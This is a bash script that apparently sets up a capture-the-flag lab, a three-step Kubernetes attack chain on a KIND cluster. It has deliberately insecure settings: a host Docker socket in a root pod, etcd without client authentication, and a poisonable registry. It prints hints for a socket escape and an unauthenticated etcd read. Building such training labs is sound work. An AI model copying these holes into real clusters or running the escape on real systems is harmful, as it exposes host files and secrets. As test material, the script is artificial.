#!/bin/bash
set -euo pipefail
K8S_ID="chain22"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-chain-docker-etcd"
source "$SCRIPT_DIR/../../scripts/k8s-common.sh"

echo "[Chain Docker-to-etcd] 3-step K8s attack chain"
echo "  K8S-17 (Docker Socket) -> K8S-09 (Registry Poison) -> K8S-08 (etcd)"

# Prepare flags
FLAG_DIR="/home/kianabin/cve-flags/chain22"
mkdir -p "$FLAG_DIR"
FLAG1="${CVE_FLAG1:-flag{chain22-step1-docker}}"
FLAG2="${CVE_FLAG2:-flag{chain22-step2-registry}}"
FLAG3="${CVE_FLAG3:-flag{chain22-step3-etcd}}"
echo "$FLAG1" > "$FLAG_DIR/step1.txt"

echo "[*] Creating unified KIND cluster with Docker socket + etcd..."
kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /var/run/docker.sock
        containerPath: /var/run/docker.sock
      - hostPath: /home/kianabin/cve-flags/chain22
        containerPath: /host-flag
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
containerdConfigPatches:
  - |-
    [plugins."io.containerd.grpc.v1.cri".registry]
      [plugins."io.containerd.grpc.v1.cri".registry.mirrors]
        [plugins."io.containerd.grpc.v1.cri".registry.mirrors."chain22-registry:5000"]
          endpoint = ["http://chain22-registry:5000"]
KINDCFG

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10
kind load docker-image docker:cli --name "$CLUSTER_NAME" 2>/dev/null || true

# Registry on the kind network, published on host port 11500 (in range)
echo "[*] Starting private registry on port 11500..."
docker rm -f chain22-registry 2>/dev/null || true
docker run -d --name chain22-registry --network kind \
  -p 11500:5000 \
  -e REGISTRY_HTTP_TLS_ENABLED=false \
  registry:2

if ! docker image inspect nginx:1.24-alpine >/dev/null 2>&1; then
  echo "[*] Pulling benign seed image nginx:1.24-alpine..."
  docker pull nginx:1.24-alpine || true
fi
docker tag nginx:1.24-alpine localhost:11500/evil:latest
seeded=false
for i in $(seq 1 20); do
  if docker push localhost:11500/evil:latest >/dev/null 2>&1; then
    seeded=true
    break
  fi
  sleep 2
done
if [ "$seeded" != true ]; then
  echo "[!] Failed to seed localhost:11500/evil:latest; refusing to deploy ImagePullBackOff target" >&2
  exit 1
fi

# Step 2 flag secret + workload SA reader
kubectl create secret generic chain22-stage2 --from-literal=flag="$FLAG2" -n default 2>/dev/null || true
kubectl apply -f - << 'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: chain22-secret-reader
  namespace: default
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: chain22-secret-reader
  namespace: default
subjects:
  - kind: ServiceAccount
    name: default
    namespace: default
roleRef:
  kind: Role
  name: chain22-secret-reader
  apiGroup: rbac.authorization.k8s.io
---
# Poisonable target Deployment (pull from the kind-network registry, Always)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: chain22-target
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: chain22-target
  template:
    metadata:
      labels:
        app: chain22-target
    spec:
      serviceAccountName: default
      containers:
        - name: app
          image: chain22-registry:5000/evil:latest
          imagePullPolicy: Always
YAML

# Step 3 final flag: custom etcd key (invisible to the Kubernetes API)
k8s_put_etcd_key "/chain22-final" "$FLAG3"

# Deploy Docker socket pod (NO flag mount - the socket escape is required)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain22-pod
  namespace: default
spec:
  containers:
    - name: attacker
      image: docker:cli
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock
        type: Socket
YAML

echo "[*] Waiting for pod readiness..."
kubectl wait --for=condition=Ready pod/chain22-pod --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pods -l app=chain22-target --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain Docker-to-etcd] Ready"
echo "  Step 1: kubectl exec -it chain22-pod -- sh"
echo "    -> docker run --rm -v /home/kianabin/cve-flags/chain22:/mnt alpine cat /mnt/step1.txt"
echo "  Step 2: push a malicious image to localhost:11500/evil:latest, delete the target pod,"
echo "          then exec the new pod and read /tmp/flag.txt (payload must read Secret chain22-stage2)"
echo "  Step 3: docker run --rm --net=host curlimages/curl:latest -sk -X POST https://127.0.0.1:2379/v3/kv/range -H 'Content-Type: application/json' -d '{\"key\":\"$(printf /chain22-final | base64 -w0)\"}'"
